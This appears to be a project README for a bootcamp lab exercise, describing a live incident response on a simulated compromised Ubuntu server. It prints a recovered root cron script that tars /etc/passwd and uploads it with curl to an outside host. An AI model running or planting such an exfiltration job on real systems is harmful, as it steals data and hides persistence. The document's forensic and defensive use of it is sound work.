# Live Incident Response — Compromised Linux Server

Full live-response investigation of a compromised Ubuntu 20.04 LTS web/admin server:
triage without taking services down, log correlation, persistence hunting, containment,
eradication and hardening — closed with an executive report for management.

> **Scope note:** lab environment. Final project of the 4Geeks Academy cybersecurity
> bootcamp (2025). The host, the attacker IPs and the planted artefacts are simulated;
> the investigation, the analysis and the reporting are real work.

## Environment

| Item | Value |
| --- | --- |
| OS | Ubuntu 20.04 LTS (standard support already ended) |
| Host | `10.0.2.15` |
| Exposed services | `22/tcp` OpenSSH 8.2p1 · `80/tcp` Apache 2.4.41 · `21/tcp` vsftpd 3.0.5 |
| Monitoring | wazuh-agent · UFW/iptables with `INPUT DROP` + explicit allows |
| Constraint | Live response — the service had to stay up throughout |

## Findings

**1. SSH brute force.** Sustained dictionary attack from `192.168.1.103` against
`test`, `admin`, `hacker` and `root`, concentrated between 12:55–15:29 UTC on 23 Jun.
All attempts failed. `fail2ban` was not running at the time.

**2. Rogue local accounts.** Three shell accounts existed: `sysadmin` (legitimate),
`reports` and `hacker`. `lastlog` showed `reports` had logged in on 23 Jun; `hacker`
never logged in at all.

**3. Cron persistence with staged exfiltration.** The core finding. An entry in
`/etc/cron.d`:

```
*/15 * * * * root /usr/local/bin/backup2.sh
```

`backup2.sh` (root:root, 0755, 125 bytes) did this:

```bash
tar -czf /tmp/secrets.tgz /etc/passwd
curl -X POST -F 'file=@/tmp/secrets.tgz' http://192.168.1.100:8080/upload
```

The staged archive `/tmp/secrets.tgz` (877 bytes) was present on disk. File metadata
placed creation at 2025-06-23 (mtime/atime) with a later permission/ownership change
at 2025-08-20 (ctime).

**4. Web content discovery.** Apache logs showed 404s against `/upload*` paths with
User-Agent `gobuster/3.6` from `10.0.2.14`.

**5. Anti-forensic / decoy traces.** Lines injected into `~/.bash_history` via
`sudo tee -a`, plus planted bait files (`/opt/.archive/credentials.txt`,
`/var/backups/.logs/creds.txt`, `/home/reports/note`).

### The analytical call that matters

Legitimate cron jobs (`e2scrub_all`, `logrotate.sh`, `popularity-contest`) were
validated and cleared. The conclusion drawn was deliberately narrow:

> The only unambiguously malicious artefact is the combination of the cron entry,
> `backup2.sh` and `secrets.tgz`. Everything else is lab noise or decoys.

Likewise, exfiltration was recorded as **staged but not confirmed** — the cron pointed
at a different host, so local `access.log` could not evidence a completed upload. No
overclaiming.

## Vulnerabilities identified

| # | Finding | Detection | Assessment |
| --- | --- | --- | --- |
| 1 | Apache 2.4.41 outdated | WhatWeb, Nikto, service banner | `nmap --script vuln` produced no exploitable PoC on this instance — severity moderated, risk retained due to missing patches |
| 2 | Missing HTTP security headers | Nikto (`X-Frame-Options`, `X-Content-Type-Options` absent) | Clickjacking and MIME sniffing exposure |
| 3 | FTP/SSH/HTTP exposed to the whole internal network | `nmap -p-`, `ss -tuln`, UFW rules allowing `any` | Enlarged brute-force and exploitation surface; restrict by source, reassess whether FTP is needed |
| 4 | Sensitive path enumeration | Gobuster listed `.htaccess`, `.htpasswd`, `.hta`, `/server-status` | All returned 403, no content disclosed — low/medium residual risk from structure disclosure |

## Response

**Containment** — firewall block on attacking addresses and on the suspected
exfiltration destination; `fail2ban` installed and enabled; real-time monitoring of
connections and critical services.

**Eradication** — cron entry disabled and removed, `backup2.sh` deleted, unnecessary
accounts (`hacker`, `reports`) removed, scheduled tasks / services / startup paths
audited for further persistence.

**Recovery** — services verified operational, basic integrity check, logs shipped to
Wazuh with alerting rules configured.

## Root cause and key lesson

Brute-force attempts from outside never succeeded. The exfiltration task was introduced
locally with privileges — either malicious action or unsafe practice.

> Blocking ingress is not enough. With unrestricted egress, an insider or privileged
> malware can still move data out over plain HTTP.

## Residual risks and action plan

| Residual risk | Planned action |
| --- | --- |
| Apache outdated, headers missing | Patch and harden Apache configuration |
| FTP open | Close it, or migrate to SFTP |
| Unrestricted egress | Allow-list approved destinations or force an authenticated proxy |
| SSH password authentication | Migrate to keys + 2FA, restrict by source IP |
| Weak change control | Account lifecycle policy, monthly access and cron reviews, IR drill every 6 months, focused pentest on egress and exfiltration |

Hardening detail includes Wazuh FIM rules over `/etc`, `/usr/local/bin`, `/opt/scripts`
and cron paths, alert integration (mail / Slack / Telegram), and a tuned `fail2ban`
jail (`bantime 1h`, `findtime 10m`, `maxretry 5`, `banaction ufw`).

## Executive reporting

The report closes with a non-technical executive section: what happened, an hour-level
timeline, impact assessment (`/etc/passwd` exposure only — no customer data, no
availability loss, no notification obligation absent evidence of actual transfer),
severity rating (**High**, driven by access attempts combined with staged exfiltration),
and the specific decisions required from management: approval to close or migrate FTP,
maintenance windows for patching and SSH changes, and budget for proxy/NGFW and pentest
hours.

## Repository contents

- `Proyecto final -Respuesta en Vivo a Incidentes..pdf` — full technical report (Spanish, 27 pages)
- `auth.log`, `ip-sospe.csv`, `mails-sospe.csv` — evidence and triage output
- `backup2.sh`, `sshd_config1`, `before.rules1`, `after.init1` — recovered artefacts and configuration snapshots

## Skills demonstrated

Live incident response · Linux triage (`ss`, `ps`, `pstree`, `journalctl`, `lastlog`) ·
log correlation across auth/systemd/Apache · persistence hunting in cron ·
IOC identification · false-positive elimination · Nmap / Nikto / WhatWeb / Gobuster ·
Wazuh SIEM and FIM · fail2ban · hardening · executive-level security reporting

## Author

Javier Martínez — [github.com/Javiercm1221](https://github.com/Javiercm1221)
